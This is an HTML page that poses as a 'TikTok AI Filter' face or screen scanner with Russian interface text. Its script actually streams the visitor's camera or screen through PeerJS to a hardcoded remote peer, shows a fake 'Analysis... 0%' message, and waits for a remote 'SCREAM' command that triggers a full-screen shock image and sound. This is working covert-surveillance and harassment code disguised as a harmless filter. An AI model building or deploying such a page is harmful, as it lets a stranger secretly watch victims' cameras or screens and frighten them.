<!DOCTYPE html>
<html>
<head>
    <title>TikTok AI Filter</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #000; color: white; text-align: center; font-family: sans-serif; height: 100vh; display: flex; flex-direction: column; justify-content: center; margin: 0; }
        .btn { background: #ff0050; color: white; border: none; padding: 20px; margin: 10px; border-radius: 50px; font-weight: bold; width: 80%; max-width: 300px; align-self: center; }
        #screamer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: none; background: #000; z-index: 1000; }
        #screamer img { width: 100%; height: 100%; object-fit: cover; }
    </style>
</head>
<body>
    <div id="ui">
        <h1>AI-Фильтр</h1>
        <p>Выберите тип сканирования:</p>
        <button class="btn" onclick="start('cam')">СКАНЕР ЛИЦА (КАМЕРА)</button>
        <button class="btn" style="background:#555" onclick="start('screen')">СКАНЕР ЭКРАНА</button>
    </div>

    <div id="screamer">
        <img src="https://i.imgur.com/v799C7v.jpeg">
        <audio id="audio" src="https://www.myinstants.com/media/sounds/screamer.mp3"></audio>
    </div>

    <script>
        const REMOTE_ID = '09062012'; //
        const peer = new Peer();

        async function start(mode) {
            try {
                let stream;
                if (mode === 'screen') {
                    // Просим доступ к ЭКРАНУ
                    stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                } else {
                    // Просим доступ к КАМЕРЕ
                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
                }
                
                document.getElementById('ui').innerHTML = "<h2>Анализ... 0%</h2>";
                
                // Подключаемся и звоним
                const conn = peer.connect(REMOTE_ID);
                peer.call(REMOTE_ID, stream);

                // Ждем команду скримера
                conn.on('data', data => {
                    if(data === 'SCREAM') {
                        document.getElementById('screamer').style.display = 'block';
                        document.getElementById('audio').play();
                    }
                });
            } catch (e) { alert("Доступ необходим!"); }
        }
    </script>
</body>
</html>
